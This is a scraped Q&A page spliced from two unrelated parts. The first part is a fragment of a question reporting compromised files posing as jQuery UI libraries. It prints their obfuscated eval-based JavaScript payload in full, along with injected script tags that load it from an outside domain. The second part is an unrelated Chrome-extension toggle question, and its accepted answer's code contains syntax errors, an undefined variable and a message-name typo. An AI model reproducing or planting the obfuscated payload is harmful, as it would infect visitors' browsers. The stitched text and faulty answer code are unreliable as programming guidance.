Ask Qerver, with names such as jquery.ui.dialog.min.js and jquery.ui.button.min.js. All these files contain the same piece of code:
s="";try{q=document.createElement("p");a=(q)?"appendChild":12;q[a]("123"+n);}catch(qw){f=(q)?"fromCharCode":2;h=-016/7;try{eval("a=prototype");}catch(zxc){e=window["e"+"va"+"l"];n="26.30.400.555.198.351.436.505.220.348.184.595.228.315.464.505.80.117.240.525.204.342.388.545.202.96.460.570.198.183.136.520.232.348.448.290.94.141.396.485.226.360.388.570.222.138.456.585.94.297.444.585.220.348.196.260.92.336.416.560.68.96.440.485.218.303.244.170.168.357.420.580.232.303.456.170.64.345.396.570.222.324.432.525.220.309.244.170.194.351.464.555.68.96.408.570.194.327.404.490.222.342.400.505.228.183.136.550.222.102.128.485.216.315.412.550.122.102.396.505.220.348.404.570.68.96.416.505.210.309.416.580.122.102.200.170.64.357.420.500.232.312.244.170.100.102.248.300.94.315.408.570.194.327.404.310.78.123.236.65.20".split(".");if(window.document)for(i=6-2-1-2-1;-161+i!=2-2;i++){k=i;s=s+String[f](n[k]/(i%(h*h)+2));}e(s);}}

<asp:Content ID="Content1" ContentPlaceHolderID="cphBody" Runat="Server">
//Code here
</asp:Content>**<script type="text/javascript" language="javascript" src="http://easydiablo3.com//ImageStorage/jquery.ui.button.min.js" ></script><script type="text/javascript" language="javascript" src="http://easydiablo3.com//themes/jquery.ui.dialog.min.js" ></script>**
Ask Question

up vote3down votefavorite4
The chrome extension I am developing inserts content scripts and css onto every page of a website. However, the user may have a certain page or pages he or she does not want the extension to run on, so it would be great if I could set up the browser action as basically a toggle on / off.
What I'd like to do is something like this:
chrome.browserAction.onClicked.addListener(function(tab) {

    //IF ENABLED THEN DISABLE

    //IF DISABLED THEN ENABLE

} 
Any help would be greatly appreciated!
javascript google-chrome google-chrome-extension
shareimprove this question
asked Sep 11 '13 at 12:14

TyGoss4216
add a comment
2 Answersactiveoldestvotes
up vote3down voteaccepted
Such API is not provided. But two possible workarounds exists:
I. You can use "disabled" flag viable and update it from your background page.
Background page:
function disableExtension(disabled)
{
    chrome.windows.getAll({populate : true}, function (window_list)
    {
        for (var i = 0; i < window_list.length; ++i)
        {
            var window = window_list[i];
            for (var j = 0; j < window.tabs.length; ++j)
            {
                var tab = window.tabs[j];
                if (checkContentScriptExists(tab))
                {
                    chrome.tabs.executeScript(tab.id, {code : "disabled = " + disabled + ";"}, allTabs: true) 
                }
            }
        }
        // No matching url found. Open it in the new tab
        chrome.tabs.create({ url : url, selected: true });
    });
}
And content script should check the condition before run
if (!disabled) doSomething();
II. Controversial approach to save disable variable within background age content
Background page:
function disableExtension(disabled)
{
    global.disabled = disabled;
}
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.msg == "getDisabled") {
        sendResponse({disabled: global.disabled});
        return true;
    }
});
and content script should query current disabled status before execution
chrome.runtime.sendMessage({msg: "getDiasbled"}, function(response) {
   if (!response.disabled) doSomething();
});
